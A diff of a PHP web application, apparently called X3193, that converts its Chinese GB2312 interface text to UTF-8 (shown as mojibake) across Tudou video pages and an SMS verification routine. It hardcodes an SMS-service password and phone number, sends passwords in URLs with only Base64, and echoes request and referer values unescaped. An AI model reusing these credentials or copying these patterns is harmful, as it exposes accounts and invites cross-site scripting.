+                        è§†é¢‘ä¸Šä¼ æˆåŠŸï¼<?php echo ($timeout/1000)?> ç§’åè¿”å›ä¸Šä¸€é¡µ
                 </td>
         </tr>   
                         		<?php       
@@ -2653,7 +4281,7 @@ function changeimg()
                 		?>
         <tr class="tdbg">
                 <td align="center" id="result" height="30" >
-                        ÊÓÆµÉÏ´«³É¹¦£¡<?php echo ($timeout/1000)?> <a href="<?php  echo trim(request("refer"))?>">·µ»ØÉÏÒ»Ò³</a>
+                        è§†é¢‘ä¸Šä¼ æˆåŠŸï¼<?php echo ($timeout/1000)?> <a href="<?php  echo trim(request("refer"))?>">è¿”å›ä¸Šä¸€é¡µ</a>
                 </td>
         </tr>   
                 		<?php  
@@ -2775,12 +4403,12 @@ function changeimg()
                         <?php 
                       	if($_SESSION["tudou"]["uname"] != '' && $_SESSION["tudou"]["pwd"] != ''){
                       	?>
-                        &nbsp;<a style="" href="<?php echo ScriptPath()."?api=tudou&pagesize=".encodeuri($pagesize)."&page=".encodeuri("1")."&uname=".encodeuri(trim($_SESSION["tudou"]["uname"]))."&pwd=".encodeuri(trim($_SESSION["tudou"]["pwd"]))."&skin=".$skincolor."&action=".encodeuri(trim('media.ulist'))."&u=".encodeuri(trim(request("u")))."&t=".encodeuri(trim(request("t")))."&c=".encodeuri(trim(request("c")))?>" target=_self>ÓÃ»§</a>
+                        &nbsp;<a style="" href="<?php echo ScriptPath()."?api=tudou&pagesize=".encodeuri($pagesize)."&page=".encodeuri("1")."&uname=".encodeuri(trim($_SESSION["tudou"]["uname"]))."&pwd=".encodeuri(trim($_SESSION["tudou"]["pwd"]))."&skin=".$skincolor."&action=".encodeuri(trim('media.ulist'))."&u=".encodeuri(trim(request("u")))."&t=".encodeuri(trim(request("t")))."&c=".encodeuri(trim(request("c")))?>" target=_self>ç”¨æˆ·</a>
                       	<?php 	
                       	}	
                         else{
                         ?>
-                        &nbsp;<a  style="" href="?api=tudou&action=<?php echo encodeuri('media.login');?>&skin=<?php echo $skincolor;?>" title="ÉÏ´«ÊÓÆµµ½ÍÁ¶¹·şÎñÆ÷">µÇÈë</a>
+                        &nbsp;<a  style="" href="?api=tudou&action=<?php echo encodeuri('media.login');?>&skin=<?php echo $skincolor;?>" title="ä¸Šä¼ è§†é¢‘åˆ°åœŸè±†æœåŠ¡å™¨">ç™»å…¥</a>
                         <?php 
                       	}
                         ?>
@@ -2806,14 +4434,14 @@ function changeimg()
 										?>
 <table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
         <tr class="tdtbg">
-                <td align="center" colspan="3" height="30"  style="<?php $style->selcolor($skincolor,'tdtbg');?>"> ²é Ñ¯ ½á ¹û </td>
+                <td align="center" colspan="3" height="30"  style="<?php $style->selcolor($skincolor,'tdtbg');?>"> æŸ¥ è¯¢ ç»“ æœ </td>
         </tr>
 </table>
 <table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
 <form name="tudou" method="POST" action="">
         <tr class="tdbg">
                 <td align="center" width=100% height="30"  style="<?php $style->selcolor($skincolor,'tdbg');?>">
-										Î´ËÑË÷µ½ÈÎºÎÏà¹ØÄÚÈİ£¡
+										æœªæœç´¢åˆ°ä»»ä½•ç›¸å…³å†…å®¹ï¼
                 </td>   
         </tr>
 </table>								
@@ -2823,7 +4451,7 @@ function changeimg()
                 ?>
 <table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
         <tr class="tdtbg">
-                <td align="center" colspan="3" height="30"  style="<?php $style->selcolor($skincolor,'tdtbg');?>"> ²é Ñ¯ ½á ¹û : ¹² <?php echo $medialist['length'];?> Ìõ </td>
+                <td align="center" colspan="3" height="30"  style="<?php $style->selcolor($skincolor,'tdtbg');?>"> æŸ¥ è¯¢ ç»“ æœ : å…± <?php echo $medialist['length'];?> æ¡ </td>
         </tr>
 </table>
 <table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
@@ -2846,13 +4474,13 @@ function changeimg()
                 ?>
         <tr class="tdbg" height="30" >
         	      <td align="center" width=4% style="<?php $style->selcolor($skincolor,'tdbg');?>">
-                        ĞòºÅ
+                        åºå·
                 </td>
                 <td align="center" width=80% style="<?php $style->selcolor($skincolor,'tdbg');?>">
-                        ±êÌâ
+                        æ ‡é¢˜
                 </td>
                 <td align="center" width=16% style="<?php $style->selcolor($skincolor,'tdbg');?>">
-                        ËÑË÷ ¿ÉÓÃ ÎŞĞ§ ÂúÔØ
+                        æœç´¢ å¯ç”¨ æ— æ•ˆ æ»¡è½½
                 </td> 
         </tr>
                 <?php 
@@ -2903,7 +4531,7 @@ function changeimg()
 			//}	
 			?>
                 <td align="center" style="<?php $i%4==3?$style->selcolor($skincolor,'tdbg'):'';?>">
-                        <?php echo "<a style=\"\" href=\"".ScriptPath()."?api=live&action=".encodeuri("account.create")."&authdata=".encodeuri(trim(request("authdata")))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".trim(request("pagesize"))."&page=".$page."&skin=".$skincolor."&domainname=".encodeuri($domainname)."\">²é¿´</a>";?> ÏÂÔØ 
+                        <?php echo "<a style=\"\" href=\"".ScriptPath()."?api=live&action=".encodeuri("account.create")."&authdata=".encodeuri(trim(request("authdata")))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".trim(request("pagesize"))."&page=".$page."&skin=".$skincolor."&domainname=".encodeuri($domainname)."\">æŸ¥çœ‹</a>";?> ä¸‹è½½ 
                 </td>
         </tr>   
                 	<?php 
@@ -2914,15 +4542,15 @@ function changeimg()
 </table>
 <table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
         <tr class="tdtbg" height="30" >
-                <td align="center" colspan="3" style="<?php $style->selcolor($skincolor,'tdtbg');?>"> ¹² <?php  echo $totalpage;?> Ò³ µÚ  
+                <td align="center" colspan="3" style="<?php $style->selcolor($skincolor,'tdtbg');?>"> å…± <?php  echo $totalpage;?> é¡µ ç¬¬  
                 <?php 
-                echo $page." Ò³ ".$sCrLf;
-                echo "<a style='' href='".httppath()."?api=tudou&action=".trim(request("action"))."&keyword=".encodeuri(trim(request('keyword')))."&mediaclassid=".encodeuri(trim(request('mediaclassid')))."&pagesize=".encodeuri($pagesize)."&page=1&skin=".$skincolor."&mediaday=".encodeuri(Trim(request('mediaday')))."&mediatime=".encodeuri(Trim(request('mediatime')))."&mediatype=".encodeuri(Trim(request('mediatype')))."&mediaorder=".encodeuri(Trim(request('mediaorder')))."'>Ê×Ò³</a> ";
+                echo $page." é¡µ ".$sCrLf;
+                echo "<a style='' href='".httppath()."?api=tudou&action=".trim(request("action"))."&keyword=".encodeuri(trim(request('keyword')))."&mediaclassid=".encodeuri(trim(request('mediaclassid')))."&pagesize=".encodeuri($pagesize)."&page=1&skin=".$skincolor."&mediaday=".encodeuri(Trim(request('mediaday')))."&mediatime=".encodeuri(Trim(request('mediatime')))."&mediatype=".encodeuri(Trim(request('mediatype')))."&mediaorder=".encodeuri(Trim(request('mediaorder')))."'>é¦–é¡µ</a> ";
                 if (floor($page)>1)
-                        echo "<a style='' href='".httppath()."?api=tudou&action=".trim(request("action"))."&keyword=".encodeuri(trim(request('keyword')))."&mediaclassid=".encodeuri(trim(request('mediaclassid')))."&pagesize=".encodeuri($pagesize)."&page=".($page-1)."&skin=".$skincolor."&mediaday=".encodeuri(Trim(request('mediaday')))."&mediatime=".encodeuri(Trim(request('mediatime')))."&mediatype=".encodeuri(Trim(request('mediatype')))."&mediaorder=".encodeuri(Trim(request('mediaorder')))."'>ÉÏÒ»Ò³</a> ";
+                        echo "<a style='' href='".httppath()."?api=tudou&action=".trim(request("action"))."&keyword=".encodeuri(trim(request('keyword')))."&mediaclassid=".encodeuri(trim(request('mediaclassid')))."&pagesize=".encodeuri($pagesize)."&page=".($page-1)."&skin=".$skincolor."&mediaday=".encodeuri(Trim(request('mediaday')))."&mediatime=".encodeuri(Trim(request('mediatime')))."&mediatype=".encodeuri(Trim(request('mediatype')))."&mediaorder=".encodeuri(Trim(request('mediaorder')))."'>ä¸Šä¸€é¡µ</a> ";
                 if (floor($page)>0 && floor($page)<floor($totalpage))
-                        echo "<a style='' href='".httppath()."?api=tudou&action=".trim(request("action"))."&keyword=".encodeuri(trim(request('keyword')))."&mediaclassid=".encodeuri(trim(request('mediaclassid')))."&pagesize=".encodeuri($pagesize)."&page=".($page+1)."&skin=".$skincolor."&mediaday=".encodeuri(Trim(request('mediaday')))."&mediatime=".encodeuri(Trim(request('mediatime')))."&mediatype=".encodeuri(Trim(request('mediatype')))."&mediaorder=".encodeuri(Trim(request('mediaorder')))."'>ÏÂÒ»Ò³</a> ";
-                echo "<a style='' href='".httppath()."?api=tudou&action=".trim(request("action"))."&keyword=".encodeuri(trim(request('keyword')))."&mediaclassid=".encodeuri(trim(request('mediaclassid')))."&pagesize=".encodeuri($pagesize)."&page=".($medialist['pagecount'])."&skin=".$skincolor."&mediaday=".encodeuri(Trim(request('mediaday')))."&mediatime=".encodeuri(Trim(request('mediatime')))."&mediatype=".encodeuri(Trim(request('mediatype')))."&mediaorder=".encodeuri(Trim(request('mediaorder')))."'>Ä©Ò³</a> ";
+                        echo "<a style='' href='".httppath()."?api=tudou&action=".trim(request("action"))."&keyword=".encodeuri(trim(request('keyword')))."&mediaclassid=".encodeuri(trim(request('mediaclassid')))."&pagesize=".encodeuri($pagesize)."&page=".($page+1)."&skin=".$skincolor."&mediaday=".encodeuri(Trim(request('mediaday')))."&mediatime=".encodeuri(Trim(request('mediatime')))."&mediatype=".encodeuri(Trim(request('mediatype')))."&mediaorder=".encodeuri(Trim(request('mediaorder')))."'>ä¸‹ä¸€é¡µ</a> ";
+                echo "<a style='' href='".httppath()."?api=tudou&action=".trim(request("action"))."&keyword=".encodeuri(trim(request('keyword')))."&mediaclassid=".encodeuri(trim(request('mediaclassid')))."&pagesize=".encodeuri($pagesize)."&page=".($medialist['pagecount'])."&skin=".$skincolor."&mediaday=".encodeuri(Trim(request('mediaday')))."&mediatime=".encodeuri(Trim(request('mediatime')))."&mediatype=".encodeuri(Trim(request('mediatype')))."&mediaorder=".encodeuri(Trim(request('mediaorder')))."'>æœ«é¡µ</a> ";
                				?>
                 				<input name="page" class='input' border="0" value="<?php  echo $page; ?>" style="height:20px;width:40px;font-size:11px;text-align:center;" <?php  $style->input("#f9f9f9",""); ?>>
 												<input type="submit" style="<?php $style->selcolor($skincolor,'tdtbg');?>" class="button" name="gotopage" value=" Go ">                 
@@ -2935,7 +4563,7 @@ function changeimg()
         </tr>   
 </table>
 <?php 
-                //$gotopage->gotopage($totalpage,httppath()."?api=tudou&action=".trim(request("action"))."&keyword=".encodeuri(trim(request('keyword')))."&mediaclassid=".encodeuri(trim(request('mediaclassid')))."&pagesize=".encodeuri($pagesize)."&skin=".$skincolor."&mediaday=".encodeuri(Trim(request('mediaday')))."&mediatime=".encodeuri(Trim(request('mediatime')))."&mediatype=".encodeuri(Trim(request('mediatype')))."&mediaorder=".encodeuri(Trim(request('mediaorder')))."&gopage=ok&page=","X3193","ÇëÔÚ¿Õ°×´¦ÊäÈëÒª×ªµ½µÄÒ³Êı");
+                //$gotopage->gotopage($totalpage,httppath()."?api=tudou&action=".trim(request("action"))."&keyword=".encodeuri(trim(request('keyword')))."&mediaclassid=".encodeuri(trim(request('mediaclassid')))."&pagesize=".encodeuri($pagesize)."&skin=".$skincolor."&mediaday=".encodeuri(Trim(request('mediaday')))."&mediatime=".encodeuri(Trim(request('mediatime')))."&mediatype=".encodeuri(Trim(request('mediatype')))."&mediaorder=".encodeuri(Trim(request('mediaorder')))."&gopage=ok&page=","X3193","è¯·åœ¨ç©ºç™½å¤„è¾“å…¥è¦è½¬åˆ°çš„é¡µæ•°");
         		}
         	}
                 break; 
@@ -2969,7 +4597,7 @@ function changeimg()
                         $tudou_media = new tudou_class();
 	          						$mediaclassid = $tudou_media->tudoumediaclassid();
 												?>
-                        <OPTION VALUE="<?php  echo $mediaclassid[0]['code'];?>">ÊÓÆµ·ÖÀà</OPTION>
+                        <OPTION VALUE="<?php  echo $mediaclassid[0]['code'];?>">è§†é¢‘åˆ†ç±»</OPTION>
                         <?php 
 	          	//print_r($mediaclassid);
                         for($i = 0; $i < count($mediaclassid);$i++){
@@ -2978,7 +4606,7 @@ function changeimg()
                         <?php 
                         }
                         ?>
-                        <OPTION VALUE="<?php  echo $mediaclassid[0]['code'];?>">Ä¬ÈÏ...</OPTION>
+                        <OPTION VALUE="<?php  echo $mediaclassid[0]['code'];?>">é»˜è®¤...</OPTION>
                         </SELECT>
 
                         <SELECT name="mediaday" size="1" <?php  $style->selectarea("#f9f9f9",""); ?> style="width:75px;height:16px;font-size:12px">
@@ -2986,7 +4614,7 @@ function changeimg()
                         $tudou_media = new tudou_class();
 	          	$mediaday = $tudou_media->tudoumediaday();
 			?>
-                        <OPTION VALUE="<?php  echo $mediaday[0]['day'];?>">·¢²¼Ê±¼ä</OPTION>
+                        <OPTION VALUE="<?php  echo $mediaday[0]['day'];?>">å‘å¸ƒæ—¶é—´</OPTION>
                         <?php 
                         for($i = 0; $i < count($mediaday);$i++){
                         ?>
@@ -2994,7 +4622,7 @@ function changeimg()
                         <?php 
                         }
                         ?>
-                        <OPTION VALUE="">Ä¬ÈÏ...</OPTION>
+                        <OPTION VALUE="">é»˜è®¤...</OPTION>
                         </SELECT>
 
                         <SELECT name="mediatime" size="1" <?php  $style->selectarea("#f9f9f9",""); ?> style="width:75px;height:16px;font-size:12px">
@@ -3002,7 +4630,7 @@ function changeimg()
                         $tudou_media = new tudou_class();
 	          	$mediatime = $tudou_media->tudoumediatime();
 			?>
-                        <OPTION VALUE="<?php  echo $mediatime[0]['time'];?>">²¥·ÅÊ±¼ä</OPTION>
+                        <OPTION VALUE="<?php  echo $mediatime[0]['time'];?>">æ’­æ”¾æ—¶é—´</OPTION>
                         <?php 
                         for($i = 0; $i < count($mediatime);$i++){
                         ?>
@@ -3010,7 +4638,7 @@ function changeimg()
                         <?php 
                         }
                         ?>
-                        <OPTION VALUE="<?php  echo $mediatime[0]['time'];?>">Ä¬ÈÏ...</OPTION>
+                        <OPTION VALUE="<?php  echo $mediatime[0]['time'];?>">é»˜è®¤...</OPTION>
                         </SELECT>
 
                         <SELECT name="mediatype" size="1" <?php  $style->selectarea("#f9f9f9",""); ?> style="width:75px;height:16px;font-size:12px">
@@ -3018,7 +4646,7 @@ function changeimg()
                         $tudou_media = new tudou_class();
 	          	$mediatype = $tudou_media->tudoumediatype();
 			?>
-                        <OPTION VALUE="<?php  echo $mediatype[0]['type'];?>">Ã½ÌåÀàĞÍ</OPTION>
+                        <OPTION VALUE="<?php  echo $mediatype[0]['type'];?>">åª’ä½“ç±»å‹</OPTION>
                         <?php 
                         for($i = 0; $i < count($mediatype);$i++){
                         ?>
@@ -3026,7 +4654,7 @@ function changeimg()
                         <?php 
                         }
                         ?>
-                        <OPTION VALUE="<?php  echo $mediatype[0]['type'];?>">Ä¬ÈÏ...</OPTION>
+                        <OPTION VALUE="<?php  echo $mediatype[0]['type'];?>">é»˜è®¤...</OPTION>
                         </SELECT>
 
                         <SELECT name="mediaorder" size="1" <?php  $style->selectarea("#f9f9f9",""); ?> style="width:75px;height:16px;font-size:12px">
@@ -3034,7 +4662,7 @@ function changeimg()
                         $tudou_media = new tudou_class();
 	          	$mediaorder = $tudou_media->tudoumediaorder();
 			?>
-                        <OPTION VALUE="<?php  echo $mediaorder[0]['order'];?>">Ã½ÌåÅÅĞò</OPTION>
+                        <OPTION VALUE="<?php  echo $mediaorder[0]['order'];?>">åª’ä½“æ’åº</OPTION>
                         <?php 
                         for($i = 0; $i < count($mediaorder);$i++){
                         ?>
@@ -3042,7 +4670,7 @@ function changeimg()
                         <?php 
                         }
                         ?>
-                        <OPTION VALUE="<?php  echo $mediaorder[0]['order'];?>">Ä¬ÈÏ...</OPTION>
+                        <OPTION VALUE="<?php  echo $mediaorder[0]['order'];?>">é»˜è®¤...</OPTION>
                         </SELECT>
 
                         <input type="text" name="pagesize" value="<?php echo $pagesize?>" style="width:19px;height:19px;font-size:12px" <?php  $style->input("#f9f9f9","") ?>>
@@ -3051,12 +4679,12 @@ function changeimg()
                         <?php 
                       	if($_SESSION["tudou"]["uname"] != '' && $_SESSION["tudou"]["pwd"] != ''){
                       	?>
-                        &nbsp;<a style="" href="<?php echo ScriptPath()."?api=tudou&pagesize=".encodeuri($pagesize)."&page=".encodeuri("1")."&uname=".encodeuri(trim($_SESSION["tudou"]["uname"]))."&pwd=".encodeuri(trim($_SESSION["tudou"]["pwd"]))."&skin=".$skincolor."&action=".encodeuri(trim('media.ulist'))."&u=".encodeuri(trim(request("u")))."&t=".encodeuri(trim(request("t")))."&c=".encodeuri(trim(request("c")))?>" target=_self>ÓÃ»§</a>
+                        &nbsp;<a style="" href="<?php echo ScriptPath()."?api=tudou&pagesize=".encodeuri($pagesize)."&page=".encodeuri("1")."&uname=".encodeuri(trim($_SESSION["tudou"]["uname"]))."&pwd=".encodeuri(trim($_SESSION["tudou"]["pwd"]))."&skin=".$skincolor."&action=".encodeuri(trim('media.ulist'))."&u=".encodeuri(trim(request("u")))."&t=".encodeuri(trim(request("t")))."&c=".encodeuri(trim(request("c")))?>" target=_self>ç”¨æˆ·</a>
                       	<?php 	
                       	}	
                         else{
                         ?>
-                        &nbsp;<a  style="" href="?api=tudou&action=<?php echo encodeuri('media.login');?>&skin=<?php echo $skincolor;?>" title="ÉÏ´«ÊÓÆµµ½ÍÁ¶¹·şÎñÆ÷">µÇÈë</a>
+                        &nbsp;<a  style="" href="?api=tudou&action=<?php echo encodeuri('media.login');?>&skin=<?php echo $skincolor;?>" title="ä¸Šä¼ è§†é¢‘åˆ°åœŸè±†æœåŠ¡å™¨">ç™»å…¥</a>
                         <?php 
                       	}
                         ?>
@@ -3078,12 +4706,12 @@ function changeimg()
 </table>
 <table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
         <tr class="tdtbg">
-                <td align="center" colspan="3"><?php echo $mediainfo['mediatitle'];?> <A style="" HREF='<?php echo trim($_SERVER['HTTP_REFERER']);?>'>·µ»Ø</A></td>
+                <td align="center" colspan="3"><?php echo $mediainfo['mediatitle'];?> <A style="" HREF='<?php echo trim($_SERVER['HTTP_REFERER']);?>'>è¿”å›</A></td>
         </tr>
 </table>
 <table width="95%" align="center" cellspacing="0" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
         <tr class="tdtbg">
-                <td align="left" colspan="3" width="100%"><?php  if (trim($_SESSION["tudou"]["uname"]) != "" && trim($_SESSION["tudou"]["pwd"]) != "") {?> [  <a style="" href="<?php echo ScriptPath()."?api=tudou&pagesize=".encodeuri($pagesize)."&page=".encodeuri("1")."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&skin=".$skincolor."&action=".encodeuri(trim('media.ulist'))."&u=".encodeuri(trim(request("u")))."&t=".encodeuri(trim(request("t")))."&c=".encodeuri(trim(request("c")))?>" target=_self>ÓÃ»§</a> - <?php echo Base64_decode(trim($_SESSION["tudou"]["uname"]));?> - <a style="color:#444444;"href="<?php echo scriptpath()."?api=tudou&skin=".$skincolor."&uname=".encodeuri(Base64_encode(trim(request("uname"))))."&pwd=".encodeuri(Base64_encode(trim(request("uname"))))."&action=".encodeuri(trim(request("action")))."&urlflag=1&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u")))."&logout=1";?>" target="_self">ÍË³ö</a> ] <?php  } ?></td>
+                <td align="left" colspan="3" width="100%"><?php  if (trim($_SESSION["tudou"]["uname"]) != "" && trim($_SESSION["tudou"]["pwd"]) != "") {?> [  <a style="" href="<?php echo ScriptPath()."?api=tudou&pagesize=".encodeuri($pagesize)."&page=".encodeuri("1")."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&skin=".$skincolor."&action=".encodeuri(trim('media.ulist'))."&u=".encodeuri(trim(request("u")))."&t=".encodeuri(trim(request("t")))."&c=".encodeuri(trim(request("c")))?>" target=_self>ç”¨æˆ·</a> - <?php echo Base64_decode(trim($_SESSION["tudou"]["uname"]));?> - <a style="color:#444444;"href="<?php echo scriptpath()."?api=tudou&skin=".$skincolor."&uname=".encodeuri(Base64_encode(trim(request("uname"))))."&pwd=".encodeuri(Base64_encode(trim(request("uname"))))."&action=".encodeuri(trim(request("action")))."&urlflag=1&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u")))."&logout=1";?>" target="_self">é€€å‡º</a> ] <?php  } ?></td>
         </tr>
 </table>
 <table width="95%" height="75%" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
@@ -3120,9 +4748,9 @@ function changeimg()
         <tr class="tdtbg" height="35" valign="center">
                 <td align="center" valign="center" id="google">
                         <form action="<?php echo ScriptPath();?>?api=tudou&action=<?php  echo encodeuri("media.ulist");?>&skin=<?php  echo $skincolor;?>" method="POST" name="tudou">
-                        &nbspÓÃ»§Ãû£º<input type="text" class="text" name="uname" value="" style="height:20px;width:20%;font-size:11px" <?php  $style->input("#f9f9f9",""); ?>>  
-                        &nbspÃÜÂë£º<input type="password" class="text" name="pwd" value="" style="height:20px;width:10%;font-size:11px" <?php  $style->input("#f9f9f9",""); ?>> 
-                        &nbspÑéÖ¤Âë£º<input <?php  $style->input("#f9f9f9",""); ?> maxlength="4" name="checkcode" id="checkcode" class="text" type="text" size="7">&nbsp;<a href="javascript:changeimg()" title="¿´²»Çå³ş£¿»»Ò»¸ö£¡"><IMG id="ccimg" height="14.5" src="<?php echo ScriptPath();?>?api=checkcode" border="0"></a>
+                        &nbspç”¨æˆ·åï¼š<input type="text" class="text" name="uname" value="" style="height:20px;width:20%;font-size:11px" <?php  $style->input("#f9f9f9",""); ?>>  
+                        &nbspå¯†ç ï¼š<input type="password" class="text" name="pwd" value="" style="height:20px;width:10%;font-size:11px" <?php  $style->input("#f9f9f9",""); ?>> 
+                        &nbspéªŒè¯ç ï¼š<input <?php  $style->input("#f9f9f9",""); ?> maxlength="4" name="checkcode" id="checkcode" class="text" type="text" size="7">&nbsp;<a href="javascript:changeimg()" title="çœ‹ä¸æ¸…æ¥šï¼Ÿæ¢ä¸€ä¸ªï¼"><IMG id="ccimg" height="14.5" src="<?php echo ScriptPath();?>?api=checkcode" border="0"></a>
                         &nbsp<input type="submit" class="button" name="docinSubmit" value=" Go ">
                </td>
         </tr>   
@@ -3157,18 +4785,18 @@ catch(XMPPHP_Exception $e) {
 
 <?php 
 function blank(){ // idoll function start
-header('Content-Type: text/html; charset=gb2312');
+header('Content-Type: text/html; charset=utf-8');
 
 $skincolor = selstyle(trim(request("skin")));
-$sCrLf = chr(13) . chr(10); // »Ø³µ + »»ĞĞ
+$sCrLf = chr(13) . chr(10); // å›è½¦ + æ¢è¡Œ
 ?>
 <head>
 <?php 
 $style = new css();
 $style->ico();
-$style->title("X3193 - ÑéÖ¤");
-$ipverify = 'n'; // y or n µ¥´¿IPÑéÖ¤
-$smsverify = 'y'; // y or n ´¿¶ÌĞÅÈÏÖ¤
+$style->title("X3193 - éªŒè¯");
+$ipverify = 'n'; // y or n å•çº¯IPéªŒè¯
+$smsverify = 'y'; // y or n çº¯çŸ­ä¿¡è®¤è¯
 //echo $smsverify;
 //echo $ipowner.'gg';   
 $IPFilter = new IPFilter('');
@@ -3186,8 +4814,8 @@ if (strtolower(trim(request('verify'))) != 'fetion' && strtolower(trim(request('
 		//union_redirect($redirecturl);
 		//session_write_close();		
 		//session_set_cookie_params(3600 * 24 * 30 * 12 * 20);
-		//ini_set('session.gc_maxlifetime',60);  //ÉèÖÃÀ¬»ø»ØÊÕ×î´óÉú´æÊ±¼ä
-		//ini_set('session.gc_probability',10);    //ºÍsession.gc_divisorÒ»Æğ¹¹³ÉÇå³ıÀ¬»øµÄÖ´ĞĞ¼¸ÂÊ
+		//ini_set('session.gc_maxlifetime',60);  //è®¾ç½®åƒåœ¾å›æ”¶æœ€å¤§ç”Ÿå­˜æ—¶é—´
+		//ini_set('session.gc_probability',10);    //å’Œsession.gc_divisorä¸€èµ·æ„æˆæ¸…é™¤åƒåœ¾çš„æ‰§è¡Œå‡ ç‡
 		//ini_set('session.gc_divisor',1);
 		//session_start();
 		//session_destroy();	
@@ -3205,8 +4833,8 @@ elseif($verifymethod != strtolower(trim(request('verify')))){
 if(strtoupper(trim(request('verify'))) != '' && strtoupper(trim(request('verifycode'))) == '' && strtoupper(trim(request('msgverifycode'))) == ''){
 
 session_set_cookie_params(3600 * 24 * 30 * 12 * 20);
-//ini_set('session.gc_maxlifetime',60);  //ÉèÖÃÀ¬»ø»ØÊÕ×î´óÉú´æÊ±¼ä
-//ini_set('session.gc_probability',10);    //ºÍsession.gc_divisorÒ»Æğ¹¹³ÉÇå³ıÀ¬»øµÄÖ´ĞĞ¼¸ÂÊ
+//ini_set('session.gc_maxlifetime',60);  //è®¾ç½®åƒåœ¾å›æ”¶æœ€å¤§ç”Ÿå­˜æ—¶é—´
+//ini_set('session.gc_probability',10);    //å’Œsession.gc_divisorä¸€èµ·æ„æˆæ¸…é™¤åƒåœ¾çš„æ‰§è¡Œå‡ ç‡
 //ini_set('session.gc_divisor',1);
 session_start();
 if(substr(PHP_VERSION, 0, 3)=='5.4'){
@@ -3231,28 +4859,28 @@ $_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['MSG'] = r
         else{
        	
       if (strtolower(trim(request('verify'))) == 'sim'){
-                  //mail('xcy6272003@126.com','X3193ÕıÔÚÑéÖ¤ÄúµÄ·ÃÎÊÈ¨ÏŞ','±¾´ÎÑéÖ¤µØÖ·Îª£º<a href="'.httppathdir().'?api=blank&verify='.strtolower(trim(request('verify'))).'&verifycode='.trim($_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))]).'&smsverify=">'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))].'</a> £¡',"Content-type: text/html; charset=gbk"."From: X3193<x3193@0318e.x3193.cu.cc>" . "\r\n" . "Reply-To: X3193<x3193@0318e.x3193.cu.cc>" . "\r\n" .'X-Mailer: PHP/' . phpversion());
+                  //mail('xcy6272003@126.com','X3193æ­£åœ¨éªŒè¯æ‚¨çš„è®¿é—®æƒé™','æœ¬æ¬¡éªŒè¯åœ°å€ä¸ºï¼š<a href="'.httppathdir().'?api=blank&verify='.strtolower(trim(request('verify'))).'&verifycode='.trim($_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))]).'&smsverify=">'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))].'</a> ï¼',"Content-type: text/html; charset=gbk"."From: X3193<x3193@0318e.x3193.cu.cc>" . "\r\n" . "Reply-To: X3193<x3193@0318e.x3193.cu.cc>" . "\r\n" .'X-Mailer: PHP/' . phpversion());
                   //$html = new mail_class();
-                  //$html->html_mail('X3193<x3193@0318e.x3193.cu.cc>','xcy6272003@126.com', 'X3193ÕıÔÚÑéÖ¤ÄúµÄ·ÃÎÊÈ¨ÏŞ', '±¾´ÎÑéÖ¤µØÖ·Îª£º<a href="'.httppathdir().'?api=blank&verify='.strtolower(trim(request('verify'))).'&verifycode='.trim($_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))]).'&smsverify=">'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))].'</a> £¡','gb2312');
+                  //$html->html_mail('X3193<x3193@0318e.x3193.cu.cc>','xcy6272003@126.com', 'X3193æ­£åœ¨éªŒè¯æ‚¨çš„è®¿é—®æƒé™', 'æœ¬æ¬¡éªŒè¯åœ°å€ä¸ºï¼š<a href="'.httppathdir().'?api=blank&verify='.strtolower(trim(request('verify'))).'&verifycode='.trim($_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))]).'&smsverify=">'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))].'</a> ï¼','gb2312');
 				      		$voxeo = new voxeo_class();
                   $voxeo->voxeosendsms('x3193','EUIfgwe7','8615998963077','The code is : '.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['SMS'].', and the IP is :'.$_SERVER['REMOTE_ADDR']);        
       }   
       elseif (strtolower(trim(request('verify'))) == 'email'){
 
-                  //mail('xcy6272003@126.com','X3193ÕıÔÚÑéÖ¤ÄúµÄ·ÃÎÊÈ¨ÏŞ','±¾´ÎÑéÖ¤µØÖ·Îª£º<a href="'.httppathdir().'?api=blank&verify='.strtolower(trim(request('verify'))).'&verifycode='.trim($_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))]).'&smsverify=">'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))].'</a> £¡',"Content-type: text/html; charset=gbk"."From: X3193<x3193@0318e.x3193.cu.cc>" . "\r\n" . "Reply-To: X3193<x3193@0318e.x3193.cu.cc>" . "\r\n" .'X-Mailer: PHP/' . phpversion());
